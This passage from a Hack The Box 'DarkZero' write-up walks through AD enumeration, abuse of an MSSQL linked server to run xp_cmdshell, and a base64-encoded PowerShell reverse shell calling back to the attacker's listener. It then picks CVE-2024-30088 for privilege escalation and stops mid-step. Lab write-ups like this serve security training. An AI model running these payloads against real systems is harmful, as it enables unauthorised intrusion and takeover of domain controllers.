|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49891/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49921/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49970/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
54830/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-06T17:40:55
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 61889/tcp): CLEAN (Timeout)
|   Check 2 (port 11545/tcp): CLEAN (Timeout)
|   Check 3 (port 58686/udp): CLEAN (Timeout)
|   Check 4 (port 58452/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 7h00m56s, deviation: 0s, median: 7h00m56s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct  6 18:40:38 2025 -- 1 IP address (1 host up) scanned in 137.95 seconds
```


# User Flag
---

## Authg as john.w


### Setup AD environment

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ IP=$(pt get ip); rm .pt/hosts 2>/dev/null; nxc smb $IP --generate-hosts-file .pt/hosts --timeout 10 && grep -F -x -v -f /etc/hosts .pt/hosts | sudo tee -a /etc/hosts && sudo ntpdate -u $IP && nxc smb -k $(cat .pt/hosts | tail -n1 | awk '{print $2}') --generate-krb5-file .pt/krb5.conf --timeout 10 && sudo cp .pt/krb5.conf /etc/krb5.conf
SMB         10.10.11.89     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False) (Null Auth:True)
2025-10-18 11:42:28.327129 (+0800) +0.004064 +/- 0.140472 10.10.11.89 s1 no-leap
SMB         DC01.darkzero.htb 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         DC01.darkzero.htb 445    DC01             [+] krb5 conf saved to: .pt/krb5.conf
SMB         DC01.darkzero.htb 445    DC01             [+] Run the following command to use the conf file: export KRB5_CONFIG=.pt/krb5.conf
```


### Assumed breach scenario

![](/assets/obsidian/1148e9d88372439f8b29462bd0c5feba.png)

Request a TGT

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ creds-set 'john.w' 'RFulUtONCOL!'
[+] Password set for user john.w

┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ getTGT.py -dc-ip $(pt get ip) "$(pt get domain)/$(pt get user):$(pt get pass)"; pt set ticket $(realpath "$(pt get user).ccache")
Impacket v0.13.0.dev0+20250926.155809.77988233 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in john.w.ccache
```


## Shell as svc_sql on DC02


### Domain Enumeration


#### Bloodhound


##### Run collectors

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ KRB5CCNAME="$(pt get ticket)" bloodhound-ce-python -d "$(pt get domain)" -ns $(pt get ip) -c all --zip -u "$(pt get user)" -k -no-pass --use-ldaps
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: darkzero.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc01.darkzero.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.darkzero.htb
INFO: Found 5 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.darkzero.htb
INFO: Done in 00M 35S
INFO: Compressing output into 20251007145227_bloodhound.zip
```

Start bloodhound

```bash
sudo /opt/sectools/ad/bloodhound-ce/bloodhound-cli up
```


##### Upload the latest collected data

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ bhcli upload `ls -t *_*hound*.zip | head -1`
INFO: Starting new file upload job...
INFO: Uploading file 20251007145227_bloodhound.zip
INFO: Ending file upload job...
INFO: Now waiting for ingestion being complete...
INFO: Ingestion completed, the data is now available.
```


##### Statistics

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ bhcli stats -d "$(pt get domain)"
┌────────────────────┬─────────┬─────────┐
│ DARKZERO.HTB       │   all   │ enabled │
├────────────────────┼─────────┼─────────┤
│ User Accounts      │       5 │       2 │
│ Computer Accounts  │       1 │       1 │
│ Domain Admins      │       1 │       1 │
│ Domain Controllers │       1 │       1 │
│ Protected Users    │       0 │       0 │
│ Groups             │      63 │         │
│ Root CAs           │       0 │         │
│ Enterprise CAs     │       0 │         │
│ Cert Templates     │       0 │         │
└────────────────────┴─────────┴─────────┘
```


##### Audit

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ bhcli audit -d "$(pt get domain)"
DARKZERO.HTB
============

[*] Interesting privileges for domain users or computers
    8 relations found
Group                        Relation                    Target                                                         Kind of Target
EVERYONE@DARKZERO.HTB        ClaimSpecialIdentity        AUTHENTICATION AUTHORITY ASSERTED IDENTITY@DARKZERO.HTB        Group
EVERYONE@DARKZERO.HTB        ClaimSpecialIdentity        KEY TRUST@DARKZERO.HTB                                         Group
EVERYONE@DARKZERO.HTB        ClaimSpecialIdentity        MFA KEY PROPERTY@DARKZERO.HTB                                  Group
EVERYONE@DARKZERO.HTB        ClaimSpecialIdentity        NETWORK@DARKZERO.HTB                                           Group
EVERYONE@DARKZERO.HTB        ClaimSpecialIdentity        NTLM AUTHENTICATION@DARKZERO.HTB                               Group
EVERYONE@DARKZERO.HTB        ClaimSpecialIdentity        SCHANNEL AUTHENTICATION@DARKZERO.HTB                           Group
EVERYONE@DARKZERO.HTB        ClaimSpecialIdentity        THIS ORGANIZATION CERTIFICATE@DARKZERO.HTB                     Group
EVERYONE@DARKZERO.HTB        ClaimSpecialIdentity        THIS ORGANIZATION@DARKZERO.HTB                                 Group

[*] Interesting privileges for guests
    8 relations found
Guest Object                 Relation                    Target                                                         Kind of Target
EVERYONE@DARKZERO.HTB        ClaimSpecialIdentity        AUTHENTICATION AUTHORITY ASSERTED IDENTITY@DARKZERO.HTB        Group
EVERYONE@DARKZERO.HTB        ClaimSpecialIdentity        KEY TRUST@DARKZERO.HTB                                         Group
EVERYONE@DARKZERO.HTB        ClaimSpecialIdentity        MFA KEY PROPERTY@DARKZERO.HTB                                  Group
EVERYONE@DARKZERO.HTB        ClaimSpecialIdentity        NETWORK@DARKZERO.HTB                                           Group
EVERYONE@DARKZERO.HTB        ClaimSpecialIdentity        NTLM AUTHENTICATION@DARKZERO.HTB                               Group
EVERYONE@DARKZERO.HTB        ClaimSpecialIdentity        SCHANNEL AUTHENTICATION@DARKZERO.HTB                           Group
EVERYONE@DARKZERO.HTB        ClaimSpecialIdentity        THIS ORGANIZATION CERTIFICATE@DARKZERO.HTB                     Group
EVERYONE@DARKZERO.HTB        ClaimSpecialIdentity        THIS ORGANIZATION@DARKZERO.HTB                                 Group

[*] Kerberoastable user accounts of high value (enabled, no MSA/gMSA)
    0 accounts found

[*] AS-REP-roastable user accounts (enabled)
    0 accounts found

[*] Accounts trusted for unconstrained delegation (enabled, no DCs)
    0 accounts found

[*] Computers with unsupported operating systems (enabled)
    0 computers found
```


##### Users with description

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ bhcli users -d "$(pt get domain)" --description
ADMINISTRATOR@DARKZERO.HTB      Built-in account for administering the computer/domain
GUEST@DARKZERO.HTB      Built-in account for guest access to the computer/domain
JOHN.W@DARKZERO.HTB
KRBTGT@DARKZERO.HTB     Key Distribution Center Service Account
NT AUTHORITY@DARKZERO.HTB
```


##### Tier 0 users

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ bhcli cypher 'MATCH p = (u:User)-[:MemberOf]->(:Base) WHERE "admin_tier_0" IN split(u.system_tags, " ") RETURN p LIMIT 1000' | jq '.[][] | select(type=="object" and has("kind") and .kind=="User") | .properties.samaccountname' -r
Administrator
```


#### Ldeep

##### Trusts

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ KRB5CCNAME="$(pt get ticket)" ldeep ldap -k -d "$(pt get domain)" -s "ldap://$(pt get dc_fqdn)" trusts
dn: CN=darkzero.ext,CN=System,DC=darkzero,DC=htb
cn: darkzero.ext
securityIdentifier: S-1-5-21-1969715525-31638512-2552845157
name: darkzero.ext
trustDirection: bidirectional
trustPartner: darkzero.ext
trustType: Windows domain running Active Directory
trustAttributes: FOREST_TRANSITIVE | CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION
flatName: darkzero-ext
```


### 1433 - Mssql : xp_cmdshell on linked server

- `darkzero\john.w` is `guest` on `DC01`'s **Microsoft SQL Server 2022**

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ KRB5CCNAME="$(pt get ticket)" mssqlclient.py -k $(pt get rhost) -windows-auth
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)> SELECT @@version;
                                                                                                                                                                                                                 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64)
        Oct  8 2022 05:58:25
        Copyright (C) 2022 Microsoft Corporation
        Enterprise Evaluation Edition (64-bit) on Windows Server 2025 Datacenter 10.0 <X64> (Build 26100: ) (Hypervisor)
```

- No interesting DB

```bash
SQL (darkzero\john.w  guest@master)> show_query
SQL (darkzero\john.w  guest@master)> enum_db
[%] select name, is_trustworthy_on from sys.databases
name     is_trustworthy_on
------   -----------------
master                   0
tempdb                   0
model                    0
msdb                     1
```

- `darkzero\john.w` can connect to remote linked server at `DC02` as `dc01_sql_svc`

```bash
SQL (darkzero\john.w  guest@master)> enum_links
[%] EXEC sp_linkedservers
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL
DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL
[%] EXEC sp_helplinkedsrvlogin
Linked Server       Local Login       Is Self Mapping   Remote Login
-----------------   ---------------   ---------------   ------------
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc
```

Use the linked server `DC02`

```bash
SQL (darkzero\john.w  guest@master)> use_link [DC02.darkzero.ext]
[%] EXEC ('select system_user as "username"') AT [DC02.darkzero.ext]
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)>
```

We have permissions to enable and use `xp_cmdshell` procedure

```bash
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
[%] EXEC ('exec master.dbo.sp_configure ''show advanced options'',1;RECONFIGURE;exec master.dbo.sp_configure ''xp_cmdshell'', 1;RECONFIGURE;') AT [DC02.darkzero.ext]
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
```

```bash
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell whoami
[%] EXEC ('exec master..xp_cmdshell ''whoami''') AT [DC02.darkzero.ext]
output
--------------------
darkzero-ext\svc_sql
NULL
```

Get a reverse shell

```bash
rlwrap -cAr nc -lvnp 1111
```

> https://gist.github.com/opabravo/c352813852eb1ef83e8c74cde84c3711

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ python ~/scripts/windows/revshell_pwsh_public.py $(pt get lhost) 1111
powershell -nop -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAyACIALAAxADEAMQAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

```bash
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell "powershell -nop -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAyACIALAAxADEAMQAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
[%] EXEC ('exec master..xp_cmdshell ''"powershell -nop -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAyACIALAAxADEAMQAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="''') AT [DC02.darkzero.ext]
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.96] from (UNKNOWN) [10.10.11.89] 60172
whoami
darkzero-ext\svc_sql
```


## Shell as nt authority system on DC02


### Enumeration

```bash
PS C:\Windows\system32> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ============================================
darkzero-ext\svc_sql S-1-5-21-1969715525-31638512-2552845157-1103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                                             Attributes
========================================== ================ =============================================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
NT SERVICE\MSSQLSERVER                     Well-known group S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003 Enabled by default, Enabled group, Group owner
LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

```bash
PS C:\Windows\system32> Get-ADDomain


AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=darkzero,DC=ext
DeletedObjectsContainer            : CN=Deleted Objects,DC=darkzero,DC=ext
DistinguishedName                  : DC=darkzero,DC=ext
DNSRoot                            : darkzero.ext
DomainControllersContainer         : OU=Domain Controllers,DC=darkzero,DC=ext
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-1969715525-31638512-2552845157
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=darkzero,DC=ext
Forest                             : darkzero.ext
InfrastructureMaster               : DC02.darkzero.ext
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=darkzero,DC=ext}
LostAndFoundContainer              : CN=LostAndFound,DC=darkzero,DC=ext
ManagedBy                          :
Name                               : darkzero
NetBIOSName                        : darkzero-ext
ObjectClass                        : domainDNS
ObjectGUID                         : 844cd2ce-3519-4a0d-ab8d-f20742c6dbec
ParentDomain                       :
PDCEmulator                        : DC02.darkzero.ext
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=darkzero,DC=ext
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {DC02.darkzero.ext}
RIDMaster                          : DC02.darkzero.ext
SubordinateReferences              : {DC=ForestDnsZones,DC=darkzero,DC=ext, DC=DomainDnsZones,DC=darkzero,DC=ext, CN=Configuration,DC=darkzero,DC=ext}
SystemsContainer                   : CN=System,DC=darkzero,DC=ext
UsersContainer                     : CN=Users,DC=darkzero,DC=ext
```

```bash
PS C:\Windows\system32> Get-ADUser -Filter {Enabled -eq $True} -Properties * | select SID, Name, SAMAccountName, Description, pwdLastSet, LastLogonDate | sort LastLogonDate


SID            : S-1-5-21-1969715525-31638512-2552845157-1105
Name           : darkzero$
SAMAccountName : darkzero$
Description    :
pwdLastSet     : 134036439184312605
LastLogonDate  :

SID            : S-1-5-21-1969715525-31638512-2552845157-1103
Name           : svc_sql
SAMAccountName : svc_sql
Description    :
pwdLastSet     : 133982735162676001
LastLogonDate  : 10/19/2025 2:14:50 PM

SID            : S-1-5-21-1969715525-31638512-2552845157-500
Name           : Administrator
SAMAccountName : Administrator
Description    : Built-in account for administering the computer/domain
pwdLastSet     : 134030393209213277
LastLogonDate  : 10/19/2025 2:21:24 PM
```


### Windows kernel exploit - CVE-2024-30088

- The machine is running `Microsoft Windows Server 2022 Datacenter 10.0.20348` without any `Hotfix` installed (KBs)

```bash
PS C:\Windows\system32> systeminfo

Host Name:                 DC02
OS Name:                   Microsoft Windows Server 2022 Datacenter
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00454-70295-72962-AA965
Original Install Date:     7/29/2025, 5:57:54 AM
System Boot Time:          10/17/2025, 6:03:25 PM
System Manufacturer:       Microsoft Corporation
System Model:              Virtual Machine
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2994 Mhz
BIOS Version:              Microsoft Corporation Hyper-V UEFI Release v4.1, 11/21/2024
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 184 MB
Virtual Memory: Max Size:  3,759 MB
Virtual Memory: Available: 88 MB
Virtual Memory: In Use:    3,671 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    darkzero.ext
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Microsoft Hyper-V Network Adapter
                                 Connection Name: Ethernet
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.16.20.2
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

We can go to [www.cvedetails.com](https://www.cvedetails.com/) and search for vulnerabilities

![](/assets/obsidian/3069ef66d8f233af74b101a639046035.png)

Since `Revision` number is missing, we can go to the last page of search result and select the oldest revision of `10.0.20348`

```bash
PS C:\Windows\system32> [System.Environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      20348  0
```

> https://www.cvedetails.com/version-list/26/100693/5/Microsoft-Windows-Server-2022.html?sha=06c8648ce0072fbb8e9d95d48a77fdebd67f200c&order=1&trc=239

![](/assets/obsidian/3aa99e96b10ef49fc1c36ce16aa24a3a.png)

Select the impact type `Privilege Escalation` for more relevant result of our need

> https://www.cvedetails.com/version/1730806/Microsoft-Windows-Server-2022-10.0.20348.230.html

![](/assets/obsidian/54ef34a867d26900cb09ed742eb0aca0.png)

After sorting the result by **EPSS** Score, the first LPE [CVE-2024-30088](https://www.cvedetails.com/cve/CVE-2024-30088/ "CVE-2024-30088 security vulnerability details") with EPSS score `87.35%` caught our eyes

> **CVSS vs EPSS Score**
> 
> - CVSS (Common Vulnerability Scoring System) : Estimated based on vulnerability **impact**
> - **EPSS** (Exploit Prediction Scoring System) : Estimated based on the **likelihood** (probability) that a vulnerability will be exploited
{: .prompt-info }

> https://www.cvedetails.com/vulnerability-list/vendor_id-26/product_id-100693/version_id-1730806/Microsoft-Windows-Server-2022-10.0.20348.230.html?page=1&opgpriv=1&year=2024&order=5

![](/assets/obsidian/b888cc9b5cd7e09615fd8735140518f5.png)

> **CVE-2024-30088**
> 
> Microsoft Windows Kernel contains a time-of-check to time-of-use (TOCTOU) race condition vulnerability that could allow for privilege escalation.
{: .prompt-info }

> Google : `CVE-2024-30088 poc`

> Ref - https://soc.cyber.wa.gov.au/advisories/20240627001-Win-Kernel-Priv-Esc-POC/

![](/assets/obsidian/b7503b03c1e44f9a1871642feaaface3.png)

> POC - https://github.com/tykawaii98/CVE-2024-30088

Start **Developer Command Prompt for VS** on a windows machine

```powershell
PS H:\> & "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Visual Studio 2022\Visual Studio Tools\Developer Command Prompt for VS 2022.lnk"
```

Download the POC

```powershell
cd H:\VM-Share\Kali\WinTools
git clone https://github.com/tykawaii98/CVE-2024-30088
cd .\CVE-2024-30088\
```

Modify the command to call after successfully exploited

> `poc/main.cpp:130`

```cpp
